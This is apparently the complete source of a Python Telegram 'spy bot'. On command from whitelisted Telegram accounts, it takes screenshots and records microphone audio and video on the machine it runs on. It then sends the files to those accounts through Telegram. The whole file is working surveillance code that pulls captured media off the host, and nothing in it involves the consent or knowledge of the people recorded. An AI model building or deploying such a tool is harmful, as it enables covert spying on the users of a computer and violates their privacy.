import os
import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
from utils import VideoRecorder, recordAudio, takeScreenShot, timeStamp


def getEnv(var, cast=None, isList=False):
    value = os.getenv(var)
    if isList:
        value = [ cast(i) if cast else i for i in value.split()]
    if cast and not isList:
        value = cast(value)
    return value


TOKEN = getEnv('TOKEN')
ALLOWED_USERS=getEnv('ALLOWED_USERS', cast=int, isList=True)
ASSETS_DIR = 'assets'

processing_id = None


if not os.path.exists(ASSETS_DIR): 
    os.makedirs(ASSETS_DIR)



bot= telebot.TeleBot(TOKEN, parse_mode='HTML')
audioRecorder = recordAudio()
vidRec = VideoRecorder()


@bot.message_handler(commands='start')
def send_welcome(message):
    user = message.from_user.id
    response = "Welcome to the spy bot" if user in ALLOWED_USERS \
         else "You are not authorised to use this bot"
    return bot.send_message(user, response)



@bot.message_handler(commands='photo')
def send_screenshot(message):
    user = message.from_user.id

    if user not in ALLOWED_USERS : return
    fileName = os.path.join(ASSETS_DIR,f"ScreenShot_{timeStamp()}.jpg")
    
    takeScreenShot(fileName)
    with open(fileName,'rb') as f:
        bot.send_photo(user, f)





@bot.callback_query_handler(func=lambda call: True)
def callback_query(call):
    # clear the options
    
    bot.edit_message_reply_markup(message_id=call.message.id, chat_id=call.message.chat.id, reply_markup=None)
    if call.data == "cb_stop_audio":
        message = bot.send_message(call.from_user.id, "Processing please wait")

        file =os.path.join(ASSETS_DIR, f"Audio_{timeStamp()}.wav")
        audioRecorder.stop(file)
        bot.edit_message_text("Recording saved successfully", message.chat.id, message.message_id)
        with open(file,'rb') as f:
            bot.send_audio(call.from_user.id, f)

    elif call.data == "cb_cancel_audio":
        # break if fail, dont send message again
        audioRecorder.stop('what_ever',True)
        bot.send_message(call.from_user.id, "Recording terminated")


    elif call.data == "cb_stop_video":
        message = bot.send_message(call.from_user.id, "Processing please wait")
        
        file = vidRec.stop()
        bot.edit_message_text("Recording saved successfully", message.chat.id, message.message_id)
        with open(file,'rb') as f:
            bot.send_video(call.from_user.id, f)

    elif call.data == "cb_cancel_video":
        # break if fail, dont send message again
        vidRec.stop('what_ever',True)
        bot.send_message(call.from_user.id, "Recording terminated")





def audioMarkup():
    markup = InlineKeyboardMarkup()
    markup.row_width = 2
    markup.add(InlineKeyboardButton("Finish", callback_data="cb_stop_audio"),
                InlineKeyboardButton("Cancel", callback_data="cb_cancel_audio"))
    return markup


def videoMarkup():
    markup = InlineKeyboardMarkup()
    markup.row_width = 2
    markup.add(InlineKeyboardButton("Finish", callback_data="cb_stop_video"),
                InlineKeyboardButton("Cancel", callback_data="cb_cancel_video"))
    return markup




@bot.message_handler(commands='audio')
def send_audio(message):
    user = message.from_user.id
    if user not in ALLOWED_USERS : return
    if audioRecorder.running: 
        bot.send_message(user, "Recording already in progress.")
    else:
        audioRecorder.start()
        bot.send_message(user, "Recording started.", reply_markup=audioMarkup())


@bot.message_handler(commands='video')
def send_video(message):
    global processing_id
    user = message.from_user.id
    if user not in ALLOWED_USERS : return
    if vidRec.running: 
        bot.send_message(user, "Recording already in progress.")
    else:
        file =os.path.join(ASSETS_DIR, f"Video_{timeStamp()}.avi")
        vidRec.start(file)
        chat = bot.send_message(user, "Recording started.", reply_markup=videoMarkup())
        processing_id = {
            'message_id' : chat.message_id,
            'chat_id':chat.chat.id
        }






bot.infinity_polling()